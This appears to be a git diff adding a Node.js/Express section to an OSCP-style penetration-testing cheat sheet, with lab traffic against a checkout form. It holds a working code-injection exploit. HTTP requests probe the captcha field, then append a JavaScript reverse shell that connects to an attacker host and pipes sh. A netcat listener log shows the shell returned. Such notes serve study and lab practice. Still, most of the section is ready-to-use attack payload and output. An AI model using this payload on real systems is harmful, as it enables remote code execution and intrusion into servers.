@@ -851,6 +851,155 @@ admin:admin
 kiero:kiero #name of the box
 ````
 ## Web Pentest <img src="https://cdn-icons-png.flaticon.com/512/1304/1304061.png" width="40" height="40" />
+### Nodes.js(express)
+```
+Send this request through burpsuite
+```
+![image](https://github.com/xsudoxx/OSCP/assets/127046919/1957806a-feed-4cbe-8f6f-d475ac99c48a)
+
+````
+POST /checkout HTTP/1.1
+
+Host: 192.168.214.250:5000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 90
+
+Origin: http://192.168.214.250:5000
+
+Connection: close
+
+Referer: http://192.168.214.250:5000/checkout
+
+Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8
+
+Upgrade-Insecure-Requests: 1
+
+
+
+full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3`
+````
+![image](https://github.com/xsudoxx/OSCP/assets/127046919/2b8e361a-4a2a-43b1-a2fa-ed41b2c8a846)
+````
+This time add a ;
+````
+````
+POST /checkout HTTP/1.1
+
+Host: 192.168.214.250:5000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 90
+
+Origin: http://192.168.214.250:5000
+
+Connection: close
+
+Referer: http://192.168.214.250:5000/checkout
+
+Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8
+
+Upgrade-Insecure-Requests: 1
+
+
+
+full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;
+````
+
+![image](https://github.com/xsudoxx/OSCP/assets/127046919/d9d57594-c10e-4755-b409-16d602a7f5f2)
+
+````
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(80, "192.168.45.191", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+````
+````
+POST /checkout HTTP/1.1
+
+Host: 192.168.214.250:5000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 90
+
+Origin: http://192.168.214.250:5000
+
+Connection: close
+
+Referer: http://192.168.214.250:5000/checkout
+
+Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8
+
+Upgrade-Insecure-Requests: 1
+
+
+
+full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;(function(){
+
+    var net = require("net"),
+
+        cp = require("child_process"),
+
+        sh = cp.spawn("sh", []);
+
+    var client = new net.Socket();
+
+    client.connect(80, "192.168.45.191", function(){
+
+        client.pipe(sh.stdin);
+
+        sh.stdout.pipe(client);
+
+        sh.stderr.pipe(client);
+
+    });
+
+    return /a/; // Prevents the Node.js application from crashing
+
+})();
+````
+````
+nc -nlvp 80  
+listening on [any] 80 ...
+connect to [192.168.45.191] from (UNKNOWN) [192.168.214.250] 46956
+id
+uid=1000(observer) gid=1000(observer) groups=1000(observer)
+````
 ### Shellshock
 ````
 nikto -ask=no -h http://10.11.1.71:80 2>&1
